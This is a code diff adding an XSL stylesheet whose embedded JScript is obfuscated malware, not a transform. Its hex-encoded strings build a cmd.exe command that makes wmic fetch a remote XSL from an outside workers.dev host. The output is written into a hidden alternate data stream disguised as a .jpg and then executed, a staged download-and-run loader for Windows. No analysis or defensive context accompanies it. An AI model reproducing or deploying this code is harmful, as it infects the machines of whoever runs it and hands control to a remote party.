@@ -1,0 +1,34 @@
+<?xml version='1.0'?>
+<stylesheet
+xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="placeholder"
+version="1.0">
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+	<![CDATA[
+		
+			
+	var manifest = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="System" version="4.0.0.0" publicKeyToken="B77A5C561934E089" /><clrClass clsid="{7D458845-B4B8-30CB-B2AD-FC4960FCDF81}" progid="System.Net.WebClient" threadingModel="Both" name="System.Net.WebClient" runtimeVersion="v4.0.30319" /></assembly>';
+	
+	try {
+		var ax = new ActiveXObject("Microsoft.Windows.ActCtx");
+		ax.ManifestText = manifest;		
+		var obj = ax.CreateObject("System.Net.WebClient");
+	} catch(e) {
+		
+	}		
+	
+	
+	var britador;	
+	britador = "07/";
+
+
+
+
+var _0xd72a=["\x72\x61\x6E\x64\x6F\x6D","\x72\x6F\x75\x6E\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x75\x72\x6C\x79\x2D\x68\x61\x6C\x6C\x2D\x63\x62\x64\x31\x2E\x73\x61\x67\x61\x74\x61\x6E\x61\x2E\x77\x6F\x72\x6B\x65\x72\x73\x2E\x64\x65\x76\x2F\x3F","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x2C\x20","\x53\x68\x65\x6C\x6C\x2E\x41\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E","\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x73\x79\x73\x74\x65\x6D\x33\x32\x5C\x63\x6D\x64\x2E\x65\x78\x65","\x20\x2F\x63\x20\x65\x63\x68\x6F\x20\x77\x6D\x69\x63\x20\x5E\x6F\x73\x20\x5E\x67\x65\x74\x20\x5E","\x5E","\x20\x5E","\x20\x5E\x2F\x66\x6F\x72\x6D\x61\x74\x3A\x22","\x23","\x22\x20\x3E\x20\x25\x54\x4D\x50\x25\x5C","\x2E\x6A\x70\x67\x3A\x69\x6E\x69\x74\x2E\x63\x6D\x64\x20\x26\x26\x20\x25\x43\x6F\x6D\x53\x70\x65\x63\x25\x20\x2D\x20\x3C\x20\x25\x54\x4D\x50\x25\x5C","\x2E\x6A\x70\x67\x3A\x69\x6E\x69\x74\x2E\x63\x6D\x64","","\x6F\x70\x65\x6E"];function krugerxwx(_0xbd54x2,_0xbd54x3){return Math[_0xd72a[1]](Math[_0xd72a[0]]()* (_0xbd54x3- _0xbd54x2)+ _0xbd54x2)}var qe127;var ss1;var ss2;var ss3;var mk25;var p8325;var kvw91;var sjjeuqkajseq;var okt18275;var rr87;var ss4;qe127= _0xd72a[2]+ britador;k741= krugerxwx(1,8);if(k741== 1){rr87= String[_0xd72a[3]](99)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](110)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](105)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](122)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](110)+ String[_0xd72a[3]](101)};if(k741== 2){rr87= String[_0xd72a[3]](102)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](112)+ String[_0xd72a[3]](104)+ String[_0xd72a[3]](121)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](105)+ String[_0xd72a[3]](99)+ String[_0xd72a[3]](97)+ String[_0xd72a[3]](108)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](121)};if(k741== 3){rr87= String[_0xd72a[3]](102)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](118)+ String[_0xd72a[3]](105)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](97)+ String[_0xd72a[3]](108)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](121)};if(k741== 4){rr87= String[_0xd72a[3]](108)+ String[_0xd72a[3]](97)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](98)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](112)+ String[_0xd72a[3]](100)+ String[_0xd72a[3]](97)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](101)};if(k741== 5){rr87= String[_0xd72a[3]](110)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](98)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](102)+ String[_0xd72a[3]](112)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](99)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](115)};if(k741== 6){rr87= String[_0xd72a[3]](110)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](109)+ String[_0xd72a[3]](98)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](102)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](115)};if(k741== 7){rr87= String[_0xd72a[3]](111)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](103)+ String[_0xd72a[3]](97)+ String[_0xd72a[3]](110)+ String[_0xd72a[3]](105)+ String[_0xd72a[3]](122)+ String[_0xd72a[3]](97)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](105)+ String[_0xd72a[3]](111)+ String[_0xd72a[3]](110)};if(k741== 8){rr87= String[_0xd72a[3]](114)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](103)+ String[_0xd72a[3]](105)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](116)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](100)+ String[_0xd72a[3]](117)+ String[_0xd72a[3]](115)+ String[_0xd72a[3]](101)+ String[_0xd72a[3]](114)+ String[_0xd72a[3]](115)};mk25= String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ _0xd72a[4];kvw91= String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ _0xd72a[4];sjjeuqkajseq= String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ _0xd72a[4];p8325= String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90))+ String[_0xd72a[3]](krugerxwx(65,90));keta7162= krugerxwx(10201,918272);var okt18275= new ActiveXObject(_0xd72a[5]);okt18275.ShellExecute(_0xd72a[6],_0xd72a[7]+ mk25+ _0xd72a[8]+ kvw91+ _0xd72a[8]+ sjjeuqkajseq+ _0xd72a[9]+ rr87+ _0xd72a[10]+ qe127+ _0xd72a[11]+ keta7162+ _0xd72a[12]+ p8325+ _0xd72a[13]+ p8325+ _0xd72a[14],_0xd72a[15],_0xd72a[16],0)
+
+
+
+	
+	]]> </ms:script>
+</stylesheet>		
